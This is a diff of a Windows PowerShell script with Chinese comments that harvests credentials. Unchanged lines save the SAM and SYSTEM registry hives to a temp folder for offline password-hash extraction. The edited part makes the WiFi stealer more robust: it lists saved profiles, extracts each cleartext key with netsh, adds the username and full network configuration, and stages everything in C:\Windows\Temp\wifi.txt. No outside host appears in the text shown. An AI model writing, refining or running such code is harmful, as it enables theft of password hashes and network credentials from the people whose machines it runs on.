@@ -11,35 +11,40 @@ reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "Loc
 reg save HKLM\SAM c:\windows\temp\sam.hiv
 reg save HKLM\SYSTEM c:\windows\temp\system.hiv
 # 網路密碼
-# 1. 檢查是否有 WiFi 設定檔
-try {
-    $profiles = (netsh wlan show profiles | Select-String "Profile|設定檔" | ForEach-Object { $_.ToString().Split(':')[-1].Trim() } | Where-Object { $_ -ne "" })
-} catch {
-    $profiles = $null
+$profiles = (netsh wlan show profiles) -match ":\s+(.+)$" | ForEach-Object { 
+    $name = $_.Split(':')[-1].Trim()
+    # 排除掉包含 "介面" 或 "Interface" 的標題行
+    if ($name -notmatch "介面|Interface|使用者|User|設定檔|Profile") { $name }
 }
-
 $results = New-Object System.Collections.Generic.List[string]
 
 if ($profiles) {
     foreach ($name in $profiles) {
+        # 取得單一 Profile 的詳細資訊
         $raw = netsh wlan show profile name="$name" key=clear
-        $pass = ($raw | Select-String "Key Content|關鍵內容" | ForEach-Object { $_.ToString().Split(':')[-1].Trim() })
-        if ($pass) { $results.Add("WiFi: $name | Password: $pass") } else { $results.Add("WiFi: $name | Password: (Open/Enterprise)") }
+        
+        # 使用通用比對：抓取包含 " :" 的行，且該行內容通常在最後面
+        # 在大多數語系中，密碼位於 "Key Content" 或 "關鍵內容" 這一行
+        $passLine = $raw | Where-Object { $_ -match "Key Content|關鍵內容|关键内容" }
+        
+        if ($passLine) {
+            $pass = $passLine.Split(':')[-1].Trim()
+            $results.Add("WiFi: $name | Password: $pass")
+        } else {
+            $results.Add("WiFi: $name | Password: (Open/Enterprise/No Permission)")
+        }
     }
 } else {
-    $results.Add("狀態: 找不到無線網路設定檔，改為抓取網卡資訊。")
+    $results.Add("狀態: 在此電腦找不到任何無線網路設定檔。")
 }
 
-# 先加入使用者名稱
-$results.Add("--- 使用者名稱 ---")
-$results.Add((whoami | Out-String))
+$results.Add("`n--- 使用者名稱 ---")
+$results.Add((whoami).Trim())
 
-# 2. 額外抓取乙太網路/所有網卡的資訊
-$results.Add("--- 網卡詳細資訊 ---")
+$results.Add("`n--- 網卡詳細資訊 ---")
 $results.Add((ipconfig /all | Out-String))
 
 $results | Out-File -FilePath "C:\Windows\Temp\wifi.txt" -Encoding utf8
-
 
 
 
